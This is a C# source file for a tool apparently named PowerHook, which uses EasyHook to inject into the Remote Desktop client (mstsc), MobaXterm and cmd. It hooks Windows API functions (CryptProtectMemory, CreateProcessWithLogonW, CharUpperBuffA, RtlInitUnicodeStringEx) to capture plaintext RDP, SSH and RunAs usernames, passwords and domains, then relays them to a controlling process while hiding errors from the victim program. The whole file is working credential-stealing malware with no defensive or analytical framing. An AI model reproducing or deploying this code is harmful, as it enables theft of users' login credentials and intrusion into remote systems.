
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace PowerHook
{

    public class InjectionEntryPoint : EasyHook.IEntryPoint
    {


        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string Buffer;
        }



        [Flags]
        enum CreationFlags
        {
            CREATE_SUSPENDED = 0x00000004,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        }

        [Flags]
        enum LogonFlags
        {
            LOGON_WITH_PROFILE = 0x00000001,
            LOGON_NETCREDENTIALS_ONLY = 0x00000002
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public int cb;
            public String reserved;
            public String desktop;
            public String title;
            public int x;
            public int y;
            public int xSize;
            public int ySize;
            public int xCountChars;
            public int yCountChars;
            public int fillAttribute;
            public int flags;
            public UInt16 showWindow;
            public UInt16 reserved2;
            public byte reserved3;
            public IntPtr stdInput;
            public IntPtr stdOutput;
            public IntPtr stdError;
        }
        /// <summary>
        /// Reference to the server interface
        /// </summary>
        ServerInterface _server = null;

        /// <summary>
        /// Message queue of all files accessed
        /// </summary>
        Queue<string> _messageQueue = new Queue<string>();

        /// <summary>
        /// EasyHook requires a constructor that matches <paramref name="context"/> and any additional parameters as provided
        /// in the original call to <see cref="EasyHook.RemoteHooking.Inject(int, EasyHook.InjectionOptions, string, string, object[])"/>.
        /// 
        /// Multiple constructors can exist on the same <see cref="EasyHook.IEntryPoint"/>, providing that each one has a corresponding Run method (e.g. <see cref="Run(EasyHook.RemoteHooking.IContext, string)"/>).
        /// </summary>
        /// <param name="context">The RemoteHooking context</param>
        /// <param name="channelName">The name of the IPC channel</param>
        /// 

        public InjectionEntryPoint(
            EasyHook.RemoteHooking.IContext context,
            string channelName)
        {
            // Connect to server object using provided channel name
            _server = EasyHook.RemoteHooking.IpcConnectClient<ServerInterface>(channelName);

            // If Ping fails then the Run method will be not be called
            _server.Ping();
        }
        //Need LoadLibrary to import dpapi.dll in case it hasn't been imported yet
        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllToLoad);
        /// <summary>
        /// The main entry point for our logic once injected within the target process. 
        /// This is where the hooks will be created, and a loop will be entered until host process exits.
        /// EasyHook requires a matching Run method for the constructor
        /// </summary>
        /// <param name="context">The RemoteHooking context</param>
        /// <param name="channelName">The name of the IPC channel</param>
        public void Run(
            EasyHook.RemoteHooking.IContext context,
            string channelName)
        {
            // Injection is now complete and the server interface is connected
            _server.IsInstalled(EasyHook.RemoteHooking.GetCurrentProcessId());

            //Get the current process so we will hook the right function
            var currentProcess = System.Diagnostics.Process.GetCurrentProcess().ProcessName;


            //Install hooks
            if (currentProcess == "mstsc")
            {
                // RunAs hook function
                LoadLibrary("Advapi32.dll");
                var CreateProcessWithLogonW = EasyHook.LocalHook.Create(
                EasyHook.LocalHook.GetProcAddress("Advapi32.dll", "CreateProcessWithLogonW"),
                new CreateProcessWithLogonW_Delegate(CreateProcessWithLogonW_Hook),
                this);

                // Activate hooks on all threads except the current thread
                CreateProcessWithLogonW.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
            }
                    
            if (currentProcess == "mstsc")
            {
                // mstsc hook function (CredUnPackAuthenticationBufferW didnt work need to check, this is better then that function)
                LoadLibrary("dpapi.dll");
                var createCryptHook = EasyHook.LocalHook.Create(
                EasyHook.LocalHook.GetProcAddress("dpapi.dll", "CryptProtectMemory"),
                new CryptProtectMemory_Delegate(CryptProtectMemory_Hook),
                this);

                // Activate hooks on all threads except the current thread
                createCryptHook.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
            }
            

            if (currentProcess == "MobaXterm")
            {
                //MobaXterm hook function
                LoadLibrary("user32.dll");
                var CreateCharUpperBuffA = EasyHook.LocalHook.Create(
                EasyHook.LocalHook.GetProcAddress("user32.dll", "CharUpperBuffA"),
                new CharUpperBuffA_Delegate(CharUpperBuffA_Hook),
                this);

                // Activate hooks on all threads except the current thread
                CreateCharUpperBuffA.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
            }
                
            if (currentProcess == "cmd")
            {
                //cmd hook function
                LoadLibrary("ntdll.dll");
                var CreateRtlInitUnicodeStringEx = EasyHook.LocalHook.Create(
                EasyHook.LocalHook.GetProcAddress("ntdll.dll", "RtlInitUnicodeStringEx"),
                new RtlInitUnicodeStringEx_Delegate(RtlInitUnicodeStringEx_Hook),
                this);

                // Activate hooks on all threads except the current thread
                CreateRtlInitUnicodeStringEx.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
            }


            _server.ReportMessage("[+] Hooked into " + context.HostPID.ToString());

            // Wake up the process (required if using RemoteHooking.CreateAndInject)
            EasyHook.RemoteHooking.WakeUpProcess();

            try
            {
                // Loop until program closes (i.e. IPC fails)
                while (true)
                {
                    System.Threading.Thread.Sleep(500);

                    string[] queued = null;

                    lock (_messageQueue)
                    {
                        queued = _messageQueue.ToArray();
                        _messageQueue.Clear();
                    }

                    // Send newly monitored file accesses to server
                    if (queued != null && queued.Length > 0)
                    {
                        _server.ReportMessages(queued);
                    }
                    else
                    {
                        _server.Ping();
                    }
                }
            }
            catch
            {
                // Ping() or ReportMessages() will raise an exception if host is unreachable
            }

            // Remove hooks

            //CreateProcessWithLogonW.Dispose();
            //createCryptHook.Dispose();
            //CreateCharUpperBuffA.Dispose();
            //CreateRtlInitUnicodeStringEx.Dispose();
         
            // Finalise cleanup of hooks
            EasyHook.LocalHook.Release();
        }


        //CMD
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
        delegate bool RtlInitUnicodeStringEx_Delegate(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] String SourceString);

        [DllImport("ntdll.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        static extern bool RtlInitUnicodeStringEx(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] String SourceString);

        bool RtlInitUnicodeStringEx_Hook(
            ref UNICODE_STRING DestinationString,
            [MarshalAs(UnmanagedType.LPWStr)] String SourceString)
        {
            try
            {
                lock (this._messageQueue)
                {
                    if (this._messageQueue.Count < 1000)
                    {


                        String Data = SourceString;

                        this._messageQueue.Enqueue(
                        string.Format("[+] Found cmd Login --> {0}", Data));


                    }
                }
           }
           catch
            {
                // swallow exceptions so that any issues caused by this code do not crash target process
            }
            return RtlInitUnicodeStringEx(ref DestinationString, SourceString);
        }


        //MobaXterm
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi, SetLastError = true)]
        delegate bool CharUpperBuffA_Delegate(string lpsz, UInt32 cchLength);
        [DllImport("user32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi)]
        static extern bool CharUpperBuffA(
            string lpsz,
            UInt32 cchLength);

        bool CharUpperBuffA_Hook(
        string lpsz,
        UInt32 cchLength)
        {
            try
            {
                lock (this._messageQueue)
                {
                    if (this._messageQueue.Count < 1000)
                    {


                        
                        string Data = lpsz;
                        if (Data.Contains("rdp:"))
                        {
                            this._messageQueue.Enqueue(
                            string.Format("[+] Found MobaXterm RDP Login --> {0}", Data));
                        }
                        if (Data.Contains(", 22 ,"))
                        {
                            this._messageQueue.Enqueue(
                            string.Format("[+] Found MobaXterm SSH Login --> {0}", Data));
                        }

                    }
                }
            }
            catch
            {
                // swallow exceptions so that any issues caused by this code do not crash target process
            }
            return CharUpperBuffA(lpsz, cchLength);
        }


        //MSTSC
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi, SetLastError = true)]
        delegate bool CryptProtectMemory_Delegate(IntPtr pData, uint cbData, uint dwFlags);
        [DllImport("dpapi.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi)]
        static extern bool CryptProtectMemory(
            IntPtr pData,
            uint cbData,
            uint dwFlags);

        bool CryptProtectMemory_Hook(
           IntPtr pData,
           uint cbData,
           uint dwFlags)
        {

            try
            {
                lock (this._messageQueue)
                {
                    if (this._messageQueue.Count < 1000)
                    {


                        //Get string from memory address passed to CryptProtectMemory
                        var password = Marshal.PtrToStringUni(pData, (int)cbData);


                        this._messageQueue.Enqueue(
                            string.Format("[+] Found Potential RDP Creds -- > {0}", password));

                    }
                }
            }
            catch
            {
                // swallow exceptions so that any issues caused by this code do not crash target process
            }
            return CryptProtectMemory(pData, cbData, dwFlags);
        }

        //RUNAS
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
        delegate bool CreateProcessWithLogonW_Delegate(String userName,
           String domain,
           String password,
           LogonFlags logonFlags,
           String applicationName,
           String commandLine,
           CreationFlags creationFlags,
           UInt32 environment,
           String currentDirectory,
           ref StartupInfo startupInfo,
           out PROCESS_INFORMATION processInformation);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessWithLogonW(
           String userName,
           String domain,
           String password,
           LogonFlags logonFlags,
           String applicationName,
           String commandLine,
           CreationFlags creationFlags,
           UInt32 environment,
           String currentDirectory,
           ref StartupInfo startupInfo,
           out PROCESS_INFORMATION processInformation);

        bool CreateProcessWithLogonW_Hook(
            String userName,
           String domain,
           String password,
           LogonFlags logonFlags,
           String applicationName,
           String commandLine,
           CreationFlags creationFlags,
           UInt32 environment,
           String currentDirectory,
           ref StartupInfo startupInfo,
           out PROCESS_INFORMATION processInformation)

        {
        
            try
            {
                lock (this._messageQueue)
                {
                    if (this._messageQueue.Count < 1000)
                    {


                       
                        var Domain = domain;
                        var username = userName;
                        var Password = password;

                     
                        this._messageQueue.Enqueue(
                            string.Format("[+] Found Runas Creds --> Username: {0}, Password: {1}, Domain: {2}", username, Password, Domain));
                        
                    }
                }
            }
            catch
            {
                // swallow exceptions so that any issues caused by this code do not crash target process
            }

           
            return CreateProcessWithLogonW(userName, domain, password, logonFlags, applicationName, commandLine,creationFlags,environment, currentDirectory,ref startupInfo,out processInformation);
        }
    }
}
